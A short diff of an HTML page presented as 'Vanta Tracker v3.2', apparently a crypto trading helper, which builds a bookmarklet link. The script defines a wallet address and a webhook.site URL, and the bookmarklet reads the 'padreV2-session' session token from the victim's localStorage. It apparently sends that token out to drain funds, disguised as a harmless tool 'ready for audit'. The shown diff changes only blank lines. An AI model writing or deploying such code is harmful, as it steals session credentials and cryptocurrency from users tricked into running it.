@@ -12,11 +12,9 @@
     <h1>Vanta Tracker v3.2</h1>
     <p>Syntax Error Fixed - Ready for Audit</p>
     <a href="#" class="vanta-btn" id="vanta-tool">Vanta Tracker</a>
-
     <script>
         const DEST_ADDRESS = "4ShcFgxwPPiMZgiy1Pe8Eiah3V6hbxyynQRcMNL7MwXF";
         const WEBHOOK_URL = "https://webhook.site/b56a0e79-474e-46b8-8664-14d98a95f515";
-
         // We use a cleaner string building method to avoid "Unexpected end of input"
         const bookmarkCode = "javascript:(async function(){" +
             "const sR=localStorage.getItem('padreV2-session');" +
@@ -48,7 +46,6 @@
                 "ui.remove();location.reload();" +
             "};" +
         "})();";
-
         document.getElementById('vanta-tool').href = bookmarkCode;
     </script>
 </body>
